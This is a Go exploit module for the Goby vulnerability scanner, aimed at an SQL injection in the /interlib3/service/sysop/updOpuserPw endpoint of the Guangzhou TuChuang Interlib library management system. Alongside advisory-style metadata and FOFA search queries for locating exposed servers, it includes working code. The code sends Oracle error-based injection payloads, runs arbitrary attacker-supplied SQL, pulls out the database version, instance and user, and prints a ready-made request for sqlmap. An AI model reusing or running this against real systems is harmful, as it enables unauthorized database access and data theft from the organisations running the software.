package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Guangzhou TuChuang Library Cluster Management System /interlib3/service/sysop/updOpuserPw SQL Injection Vulnerability",
    "Description": "<p>The Guangzhou TuChuang Library Cluster Management System has an SQL injection vulnerability in the /interlib3/service/sysop/updOpuserPw interface. Attackers can exploit this vulnerability to execute arbitrary SQL statements and obtain sensitive information from the database.</p>",
    "Product": "Guangzhou TuChuang Library Cluster Management System",
    "Homepage": "http://www.gzlib.com/",
    "DisclosureDate": "2024-04-12",
    "PostTime": "2024-11-14",
    "Author": "2987612621@qq.com",
    "FofaQuery": "body=\"interlib/common/\" || body=\"Interlib图书馆集群管理系统\" || body=\"/interlib3/system_index\" || body=\"打开Interlib主界面\" || (body=\"广州图创\" && body=\"/interlib/common/\")",
    "GobyQuery": "body=\"interlib/common/\" || body=\"Interlib图书馆集群管理系统\" || body=\"/interlib3/system_index\" || body=\"打开Interlib主界面\" || (body=\"广州图创\" && body=\"/interlib/common/\")",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the SQL injection vulnerability to obtain sensitive information from the database, potentially leading to data leakage or tampering.</p>",
    "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version</p><p><a href=\"http://www.gzlib.com/\">http://www.gzlib.com/</a></p><p>2.It is recommended to parameterize SQL statements to avoid directly concatenating user input. Regularly update the system to fix known vulnerabilities.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/137698182?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,sql,sqlPoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "version,instance_name,user",
            "show": "attackType=default"
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select banner from sys.v_$version where rownum=1",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "广州图创 图书馆集群管理系统 /interlib3/service/sysop/updOpuserPw SQL 注入漏洞",
            "Product": "广州图创图书馆集群管理系统",
            "Description": "<p>广州图创图书馆集群管理系统在 /interlib3/service/sysop/updOpuserPw 接口存在SQL注入漏洞，攻击者可以通过该漏洞执行任意SQL语句，获取数据库中的敏感信息。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本&nbsp;<br></p><p><a href=\"http://www.gzlib.com/\">http://www.gzlib.com/</a><br></p><p>2、建议对SQL语句进行参数化处理，避免直接拼接用户输入。定期更新系统以修复已知漏洞。</p>",
            "Impact": "<p>攻击者可以通过SQL注入漏洞获取数据库中的敏感信息，可能导致数据泄露或篡改。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Guangzhou TuChuang Library Cluster Management System /interlib3/service/sysop/updOpuserPw SQL Injection Vulnerability",
            "Product": "Guangzhou TuChuang Library Cluster Management System",
            "Description": "<p>The Guangzhou TuChuang Library Cluster Management System has an SQL injection vulnerability in the /interlib3/service/sysop/updOpuserPw interface. Attackers can exploit this vulnerability to execute arbitrary SQL statements and obtain sensitive information from the database.</p>",
            "Recommendation": "<p>1.Follow the official patch release information, apply patches or upgrade to the latest version<br></p><p><a href=\"http://www.gzlib.com/\">http://www.gzlib.com/</a><br></p><p>2.It is recommended to parameterize SQL statements to avoid directly concatenating user input. Regularly update the system to fix known vulnerabilities.</p>",
            "Impact": "<p>Attackers can exploit the SQL injection vulnerability to obtain sensitive information from the database, potentially leading to data leakage or tampering.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9971"
}`

	sendPayloaddgksjb := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		//按需求选择自己的发包方式

		//---------------------------------------------
		//以下是发包具体内容,这里以POST请求为例
		//---------------------------------------------
		//漏洞的url
		//对url进行编码
		//1' AND 9428=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(122)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9428=9428) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(120)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) OR 'IUKh'='gUCM

		encode_sql := strings.ReplaceAll(sql, " ", "%20")
		url := `/interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(` + encode_sql + `))=%272`
		//拼接sql语句
		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
		}
		resp, err := setGetRequest(hostInfo, url, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloaddgksjb
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := `select banner from sys.v_$version where rownum=1`
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, `主题词表 `) {
				return false
			}
			if !strings.Contains(resp.Utf8Html, ` 不存在`) {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/interlib3/service/sysop/updOpuserPw`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloaddgksjb
			attackType := goutils.B2S(stepLogs.Params["attackType"])

			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "default":
				panduan := goutils.B2S(stepLogs.Params["default"])
				sql := ""
				if panduan == "version" {
					sql = "SELECT banner FROM sys.v_$version WHERE rownum=1"
				} else if panduan == "instance_name" {
					sql = "select instance_name from V$INSTANCE"
				} else if panduan == "user" {
					sql = "select sys_context('userenv','current_user') from dual"
				}

				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`主题词表 ([^ ]+) `)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + match[1]
				return expResult
			case "sql":
				sql := goutils.B2S(stepLogs.Params["sql"])
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`主题词表 ([^ ]+) `)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + match[1]
				return expResult

			case "sqlPoint":
				sql := "select banner from sys.v_$version where rownum=1"
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `GET /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%20instance_name%20from%20V$INSTANCE))=%272 HTTP/1.1
  Host: ` + expResult.HostInfo.HostInfo + `
  User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
  `
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))

}
